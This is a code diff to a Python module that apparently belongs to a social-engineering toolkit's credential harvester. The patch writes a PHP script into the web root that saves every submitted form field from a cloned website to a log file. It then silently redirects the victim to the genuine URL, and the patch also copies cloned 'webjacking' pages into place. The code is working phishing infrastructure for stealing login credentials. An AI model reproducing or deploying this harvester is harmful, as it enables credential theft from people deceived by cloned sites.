@@ -432,17 +432,25 @@ def run():
             print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
         except Exception, e:
                 print e 
-                pause = raw_input("TEST")
         print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
         filewrite = file("%s/post.php" % (apache_dir), "w")
         now=datetime.datetime.today()
-        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
+        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (now, RAW_URL))
         filewrite.close()
         filewrite = file("%s/harvester_%s.txt" % (logpath,now), "w")
         filewrite.write("")
         filewrite.close()
         subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
+
+        # if we are using webjacking, etc.
+        if os.path.isfile(setdir + "/web_clone/index2.html"):
+            # need to copy the files over - remove the old one first if there
+            if os.path.isfile(apache_dir + "/index2.html"):
+                os.remove(apache_dir + "/index2.html")
+
+            shutil.copyfile(setdir + "/web_clone/index2.html", apache_dir + "/index2.html")
+
         # here we specify if we are tracking users and such
         if track_email == True:
             fileopen = file (setdir + "/web_clone/index.html", "r")
@@ -453,6 +461,9 @@ def run():
             filewrite.close()
             os.remove(setdir + "/web_clone/index.html")
             shutil.copyfile(setdir + "/web_clone/index.2", setdir + "/web_clone/index.html")
+            # copy the entire web_clone directory.  
+            # Without this only index.php|html are copied even though the user may have chosen to import the entire directory in the set module.
+            copyfolder(setdir + "/web_clone", apache_dir)
         if os.path.isfile("%s/index.html" % (apache_dir)):
             os.remove("%s/index.html" % (apache_dir))
         if track_email == False:
